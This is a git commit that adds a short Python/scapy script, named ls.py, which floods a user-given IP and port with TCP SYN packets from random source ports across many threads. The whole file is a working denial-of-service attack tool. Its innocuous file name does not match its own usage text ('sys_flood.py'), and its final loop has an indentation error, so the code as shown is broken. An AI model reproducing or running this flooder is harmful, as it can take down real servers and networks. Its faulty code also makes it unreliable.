4d1d20767aa3df26373e37da502d5b42f065e871
HXT <gh0stsync.rt@gmail.com>
2018-12-24 15:50:48 +0700

    Create ls.py

---
+++ ls.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python
+#coding=utf-8
+
+from scapy.all import *
+from time import sleep
+import thread
+import random
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+if len(sys.argv)!=4:
+    print "usage: ./sys_flood.py [IP] [Port] [thread count]"
+    sys.exit()
+target = str(sys.argv[1])
+port = int(sys.argv[2])
+threads = int(sys.argv[3])
+
+print "syn_flood to %s,ctrl+c to for exit..." %target
+def synflood(target,port):
+    while 1:
+        x = random.randint(0,65535)
+        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
+for x in range(0,threads):
+	thread.start_new_thread(synflood,(target,port))
+
+while 1:
+sleep(1)
